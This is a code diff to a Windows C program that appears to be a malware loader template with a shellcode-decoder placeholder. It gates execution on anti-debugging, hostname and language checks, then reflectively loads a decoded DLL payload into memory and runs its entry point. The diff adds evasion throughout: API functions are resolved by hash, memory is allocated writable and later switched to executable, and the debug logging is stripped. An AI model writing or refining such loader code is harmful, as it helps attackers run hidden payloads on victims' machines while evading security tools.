@@ -18,15 +18,15 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     int money_spent = 0; // Initialize money spent tracker
     
     printf("beginning\n");    
-    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH); // Load NTDLL module
-    HMODULE hKernel32dll = NULL; // Placeholder for Kernel32 module handle
+    HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
+    HMODULE hUser32dll = NULL; // Placeholder for Kernel32 module handle
     
     // Check if the program is being debugged
     if (!is_being_debugged()) {
-        printf("Error during file openning : %s\n", path); // Debugging detected
+        printf("Error during file openning\n"); // Debugging detected
         return 1;
     } else {
-        hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
+        hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
     }
     
     // Validate hostname and adjust money spent accordingly
@@ -44,8 +44,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         money_spent += divide(money, 2); // Penalty for invalid computer
     }
     
-    HMODULE hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
-
     // Validate language settings and adjust money spent
     if (!is_valid_language(hKernel32dll, hUser32dll)) {
         money_spent += add(money, 500); // Penalty for invalid language
@@ -66,34 +64,36 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
             Sleep(delay); // Simulate processing delay
         }
     } else {
+
+        VirtualAllocEx_t _AllocVirtMem = (VirtualAllocEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_ALLOC_HASH);
+        WriteProcessMemory_t _WriteVirtMem = (WriteProcessMemory_t)CustomGetProcAddress(hKernel32dll, WRITE_MEMORY_HASH);
+        VirtualProtectEx_t _ProtectVirtMem = (VirtualProtectEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_PROTECT_HASH);
+        LoadLibraryA_t _LoadLibraryA = (LoadLibraryA_t)CustomGetProcAddress(hKernel32dll, LOAD_LIBRARY_HASH);
+        GetProcAddress_t _GetProcAddress = (GetProcAddress_t)CustomGetProcAddress(hKernel32dll, GET_PROC_ADDRESS_HASH);
+
         // Execute payload if no money was spent
-        // Step 1 : Get DLL's NT headers
+        // Step 0 : Decode the payload
         %SHELLCODE_DECODER% // Placeholder for shellcode decoding logic
 
+        // Step 1 : Get DLL's NT headers
+
         PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);
-        Debug("PE_getNthdrs() returned %p", dll_htHeaders);
 
         // Step 2: Allocate memory at dll's preferred virtual address
         SIZE_T dll_vSize = dll_htHeaders->OptionalHeader.SizeOfImage;
         LPVOID dll_vAddr = (LPVOID)dll_htHeaders->OptionalHeader.ImageBase;
 
-        Debug("DLL size %lu, base address %p", dll_vSize, dll_vAddr);
-
-
-        LPVOID allocated_vAddr = VirtualAllocEx(CUR_PROC, dll_vAddr, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        LPVOID allocated_vAddr = _AllocVirtMem((HANDLE)-1, dll_vAddr, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
         if (!allocated_vAddr) {
-            Debug("Preferred address allocation failed. Allocating at arbitrary address...");
-            allocated_vAddr = VirtualAllocEx(CUR_PROC, NULL, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            if (!allocated_vAddr) Fail("Memory allocation failed");
+            allocated_vAddr = _AllocVirtMem((HANDLE)-1, NULL, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+            if (!allocated_vAddr) return 1;//"Memory allocation failed");
         }
-        Debug("DLL allocated at: %p", allocated_vAddr);
-
         // Get delta between preferred and allocated address
         DWORD_PTR delta = (DWORD_PTR)allocated_vAddr - (DWORD_PTR)dll_vAddr;
 
         // Step 3: Copy the DLL headers 
-        if (!WriteProcessMemory((HANDLE)-1, allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders, NULL))
-            Fail("WriteProcessMemory() failed");
+        if (!_WriteVirtMem((HANDLE)-1, allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders, NULL))
+            return 1;//"_WriteVirtMem() failed");
 
 
         // Step 4: Copy the DLL sections
@@ -103,14 +103,12 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
             LPVOID sectionData = (LPVOID)((ULONG_PTR)payload + section[i].PointerToRawData);
             SIZE_T sectionSize = section[i].SizeOfRawData;
 
-            Debug("Copying section %s to %p", section[i].Name, sectionAddr);
-            if (!WriteProcessMemory(CUR_PROC, sectionAddr, sectionData, sectionSize, NULL))
-                Fail("WriteProcessMemory() failed");
+            if (!_WriteVirtMem((HANDLE)-1, sectionAddr, sectionData, sectionSize, NULL))
+                return 1;//"_WriteVirtMem() failed for section %s", section[i].Name);
         }
 
         // Step 5: Handle relocation if allocated at a different address
         if (allocated_vAddr != dll_vAddr) {
-            Debug("Relocation needed");
 
             IMAGE_DATA_DIRECTORY relocations = dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
             if (relocations.Size > 0) {
@@ -123,7 +121,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
                         if (relocationEntries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                             DWORD_PTR* addressToPatch = (DWORD_PTR*)((ULONG_PTR)allocated_vAddr + relocationBlock->VirtualAddress + (relocationEntries[i] & 0xFFF));
                             *addressToPatch += delta;
-                            Debug("Relocated address at: %p", addressToPatch);
                         }
                     }
 
@@ -134,7 +131,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
         // Step 6: Resolve imports
         if (dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
-            Debug("Imports needed");
             PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)allocated_vAddr +
                 dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
@@ -143,9 +139,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
             while (importDesc->Name) {
                 libraryName = (char*)((ULONG_PTR)allocated_vAddr + importDesc->Name);
-                Debug("Loading library: %s", libraryName);
-                library = LoadLibraryA(libraryName);
-                if (!library) Fail("Failed to load module: %s", libraryName);
+                library = _LoadLibraryA(libraryName);
+                if (!library) return 1;//"Failed to load module: %s", libraryName);
 
                 PIMAGE_THUNK_DATA thunkILT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->OriginalFirstThunk);
                 PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->FirstThunk);
@@ -154,31 +149,33 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
                     FARPROC procAddress = NULL;
 
                     if (thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
-                        Debug("Import by ordinal: 0x%X", thunkILT->u1.Ordinal & 0xFFFF);
-                        procAddress = GetProcAddress(library, (LPCSTR)(thunkILT->u1.Ordinal & 0xFFFF));
+                        procAddress = _GetProcAddress(library, (LPCSTR)(thunkILT->u1.Ordinal & 0xFFFF));
                     } else {
                         PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)allocated_vAddr + thunkILT->u1.AddressOfData);
-                        Debug("Import by name: %s", importByName->Name);
-                        procAddress = GetProcAddress(library, importByName->Name);
+                        procAddress = _GetProcAddress(library, importByName->Name);
                     }
 
-                    if (!procAddress) Fail("Failed to resolve import");
+                    if (!procAddress) return 1;//"Failed to resolve import");
 
-                    Debug("Resolved import: %p", procAddress);
                     thunkIAT->u1.Function = (ULONG_PTR)procAddress;
                     thunkILT++;
                     thunkIAT++;
                 }
-                Debug("Finished processing library: %s", libraryName);
                 importDesc++;
             }
+        }
+
+        // Step 6.1: Set the memory protection to PAGE_EXECUTE_READ
+        DWORD oldProtect = 0;
+        if (!_ProtectVirtMem((HANDLE)-1, allocated_vAddr, dll_vSize, PAGE_EXECUTE_READ, &oldProtect)) {
+            return 1;//"VirtualProtectEx() failed");
         }
 
         // Step 7: Execute the loaded DLL (DllMain())
         DllEntryPoint DLLMain = (DllEntryPoint)((ULONG_PTR)allocated_vAddr + dll_htHeaders->OptionalHeader.AddressOfEntryPoint);
         DLLMain((HINSTANCE)allocated_vAddr, DLL_PROCESS_ATTACH, NULL);
 
-        Debug("done");
+        printf("done");
     }
 
     return 0; // Exit the program
